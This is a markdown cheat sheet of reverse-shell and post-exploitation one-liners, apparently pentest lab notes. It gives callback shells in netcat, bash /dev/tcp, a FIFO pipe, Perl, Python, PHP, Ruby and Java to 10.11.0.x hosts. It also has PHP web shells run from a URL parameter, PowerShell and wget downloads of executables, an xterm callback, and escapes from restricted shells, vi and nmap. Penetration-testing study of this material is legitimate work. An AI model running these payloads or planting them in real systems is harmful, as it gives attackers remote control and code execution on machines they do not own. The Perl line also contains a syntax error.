
# netcat
```nc -e /bin/sh 10.11.0.130 443```

# Simple bash revshell
```bash -i >& /dev/tcp/10.11.0.130/443 0>&1```

# Bash FIFO
```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.130 443 >/tmp/f```

# Perl
```
perl -e 'use Socket;$i="10.11.0.130";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
# Python
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.185",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
# PHP
```php -r '$sock=fsockopen("10.11.0.185",1234);exec("/bin/sh -i <&3 >&3 2>&3");'```

# Ruby
```ruby -rsocket -e'f=TCPSocket.open("10.11.0.185",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d2>&%d",f,f,f)'```

# PHP WebShell 
```<?php echo shell_exec($_GET['cmd']);?>```

```<?php system($_GET['cmd']);?>```

# JAVA
```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line
2>&5 >&5; done"] as String[])
p.waitFor()
```

* * * 

# Powershell
#### Powershell 2
```(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe","C:\lec\accesschk.exe")```

#### Powershell 3
```Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"```

```Wget/fetch```

```Wget http://10.11.0.130/test.txt -o C:\temp\test.txt```

# xterm
"One of the simplest forms of reverse shell is an xterm session. 
The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001:

```xterm -display 10.0.0.1:1```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001). 

One way to do this is with Xnest (to be run on your system):

```Xnest :1```

You’ll need to authorise the target to connect to you (command also run on your host):

```xhost +targetip```

**More:**

https://highon.coffee/blog/reverse-shell-cheat-sheet/
http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

* * * 

# Shell Escape; from Shellcatraz
```
python -c 'import pty; pty.spawn("/bin/sh")'

echo os.system('/bin/bash')

/bin/sh -i

perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"

lua: os.execute('/bin/sh')
(From within IRB)

exec "/bin/sh"
(From within vi)

:!bash
(From within vi)

:set shell=/bin/bash:shell
(From within nmap)

!sh
```

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
